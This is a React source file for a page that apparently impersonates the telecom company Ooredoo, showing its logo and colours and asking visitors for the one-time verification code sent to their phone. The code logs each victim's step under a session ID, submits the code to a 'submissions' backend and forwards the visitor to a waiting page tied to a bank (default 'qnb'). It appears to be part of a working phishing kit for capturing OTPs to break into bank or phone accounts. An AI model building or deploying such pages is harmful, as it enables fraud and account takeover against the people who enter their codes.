import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";

export default function OtpOoredoo() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const { language, setLanguage } = useLanguage();
  const sessionId = localStorage.getItem("sessionId") || params.get("session") || "";
  const showError = params.get("error") === "true";

  const isArabic = language === "ar";

  const [otp, setOtp] = useState("");
  const submitOtpMutation = trpc.submissions.submitOtp.useMutation();
  const reportStepMutation = trpc.submissions.reportStep.useMutation();

  useEffect(() => {
    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
    if (currentSessionId) {
      reportStepMutation.mutate({
        sessionId: currentSessionId,
        step: "otp_ooredoo"
      });
    }
  }, []);

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 6);
    setOtp(value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
    const bank = params.get("bank") || "qnb";

    if (otp.length < 4) {
      toast.error(isArabic ? "يجب أن يكون الرمز مكتملاً" : "Code must be complete");
      return;
    }
    try {
      await submitOtpMutation.mutateAsync({
        sessionId: currentSessionId,
        otpCode: otp,
        otpType: "ooredoo",
      });
      // التقدم فقط بعد نجاح الإرسال
      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=success`);
    } catch (error) {
      console.error("Error submitting Ooredoo OTP:", error);
      toast.error(isArabic ? "حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى." : "Error during submission. Please try again.");
    }
  };

  return (
    <div className="page-wrapper" dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
        .page-wrapper { font-family: 'Cairo', sans-serif; background-color: #ffffff; margin: 0; padding: 0; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 500px; box-sizing: border-box; }
        
        header { padding: 15px; display: flex; align-items: center; justify-content: space-between; border-bottom: 2px solid #d71920; background-color: #ffffff; }
        .menu-icon { font-size: 24px; cursor: pointer; color: #d71920; font-weight: bold; width: 40px; }
        .logo-container { flex-grow: 1; display: flex; align-items: center; justify-content: center; background-color: #ffffff !important; padding: 0 15px; }
        .logo-container img { height: 45px; width: auto; display: block; }
        
        .lang-switch { width: 50px; text-align: center; font-size: 10px; color: #d71920; border: 1px solid #d71920; padding: 3px 5px; border-radius: 12px; cursor: pointer; font-weight: bold; }
        .error-message { background-color: #fef2f2; color: #991b1b; border: 1px solid #fee2e2; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: bold; font-size: 14px; }

        .content-body { padding: 20px; }
        h1 { font-size: 24px; color: #333; margin-top: 20px; margin-bottom: 10px; }
        .sub-text { color: #666; font-size: 14px; margin-bottom: 25px; }
        .input-group { margin-bottom: 15px; }
        input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; text-align: center; letter-spacing: 5px; }
        .login-btn { width: 100%; padding: 15px; background-color: #d71920; color: white; border: none; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; max-width: 300px; margin: 0 auto; display: block; margin-top: 20px; }
      `}</style>
      <div className="container">
        <header>
          <div className="menu-icon">☰</div>
          <div className="logo-container">
            <img src="https://i.ibb.co/LzNfX8fL/ooredoo-logo.png" alt="Ooredoo Logo" />
          </div>
          <div className="lang-switch" onClick={() => setLanguage(language === "ar" ? "en" : "ar")} style={{ cursor: "pointer" }}>
            {language === "ar" ? "English" : "العربية"}
          </div>
        </header>
        <div className="content-body">
          {showError && (
            <div className="error-message" style={{ backgroundColor: '#fee2e2', color: '#dc2626', border: '1px solid #fecaca', padding: '15px', borderRadius: '12px', marginBottom: '20px', fontWeight: 'bold' }}>
              {isArabic ? "الرمز غير صحيح او غير صالح" : "Invalid or incorrect code"}
            </div>
          )}
          <h1>{isArabic ? "رمز التحقق" : "Verification Code"}</h1>
          <p className="sub-text">{isArabic ? "يرجى إدخال رمز التحقق (OTP) المرسل إلى هاتفك." : "Please enter the verification code (OTP) sent to your phone."}</p>
          <form onSubmit={handleSubmit}>
            <div className="input-group">
              <input
                type="text"
                placeholder="000000"
                maxLength={6}
                value={otp}
                onChange={handleOtpChange}
                required
              />
            </div>
            <button type="submit" className="login-btn">
              {isArabic ? "تأكيد" : "Confirm"}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
